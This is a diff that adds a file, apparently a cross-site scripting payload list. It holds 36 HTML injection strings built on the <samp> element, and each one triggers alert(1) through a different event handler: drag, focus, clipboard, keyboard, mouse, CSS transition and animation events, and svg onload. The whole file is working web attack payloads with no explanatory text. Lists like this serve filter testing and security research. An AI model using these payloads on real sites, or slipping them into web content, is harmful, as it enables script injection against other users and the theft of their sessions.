@@ -1,0 +1,36 @@
+<samp draggable="true" ondrag="alert(1)">test</samp>
+<samp draggable="true" ondragend="alert(1)">test</samp>
+<samp draggable="true" ondragenter="alert(1)">test</samp>
+<samp draggable="true" ondragleave="alert(1)">test</samp>
+<samp draggable="true" ondragstart="alert(1)">test</samp>
+<samp id=x tabindex=1 onactivate=alert(1)></samp>
+<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>
+<samp id=x tabindex=1 onfocus=alert(1)></samp>
+<samp id=x tabindex=1 onfocusin=alert(1)></samp>
+<samp onbeforecopy="alert(1)" contenteditable>test</samp>
+<samp onbeforecut="alert(1)" contenteditable>test</samp>
+<samp onbeforepaste="alert(1)" contenteditable>test</samp>
+<samp onclick="alert(1)">test</samp>
+<samp oncontextmenu="alert(1)">test</samp>
+<samp oncopy="alert(1)" contenteditable>test</samp>
+<samp oncut="alert(1)" contenteditable>test</samp>
+<samp ondblclick="alert(1)">test</samp>
+<samp onkeydown="alert(1)" contenteditable>test</samp>
+<samp onkeypress="alert(1)" contenteditable>test</samp>
+<samp onkeyup="alert(1)" contenteditable>test</samp>
+<samp onmousedown="alert(1)">test</samp>
+<samp onmouseenter="alert(1)">test</samp>
+<samp onmouseleave="alert(1)">test</samp>
+<samp onmousemove="alert(1)">test</samp>
+<samp onmouseout="alert(1)">test</samp>
+<samp onmouseover="alert(1)">test</samp>
+<samp onmouseup="alert(1)">test</samp>
+<samp onpaste="alert(1)" contenteditable>test</samp>
+<style>:target {color: red;}</style><samp id=x style="transition:color 10s" ontransitioncancel=alert(1)></samp>
+<style>:target {color:red;}</style><samp id=x style="transition:color 1s" ontransitionend=alert(1)></samp>
+<style>:target {transform: rotate(180deg);}</style><samp id=x style="transition:transform 2s" ontransitionrun=alert(1)></samp>
+<style>@keyframes slidein {}</style><samp style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></samp>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style="position:absolute;" onanimationcancel="alert(1)"></samp>
+<style>@keyframes x{}</style><samp style="animation-name:x" onanimationend="alert(1)"></samp>
+<style>@keyframes x{}</style><samp style="animation-name:x" onanimationstart="alert(1)"></samp>
+<svg><samp onload=alert(1)></samp>
